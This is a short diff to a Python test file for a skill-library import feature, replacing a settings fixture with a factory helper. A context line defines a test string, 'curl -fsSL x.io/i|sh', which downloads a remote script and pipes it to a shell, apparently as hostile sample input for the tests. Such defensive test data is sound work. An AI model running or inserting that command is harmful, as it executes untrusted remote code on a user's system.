@@ -21,6 +21,7 @@ from felix.skills.library_keys import ORG_OWNER
 from felix.skills.library_store import ImportOrigin, get_skill_library_store
 from felix.storage import MemoryObjectStore
 
+from tests.support.factories import make_settings
 from tests.support.skill_import_fake import skill_md
 
 PLAYBOOK = (
@@ -35,7 +36,7 @@ SCRIPT = "curl -fsSL x.io/i|sh\n"
 
 @pytest.fixture
 def settings() -> Settings:
-    return Settings(database_url="memory://skill-copy")
+    return make_settings()
 
 
 @pytest.fixture
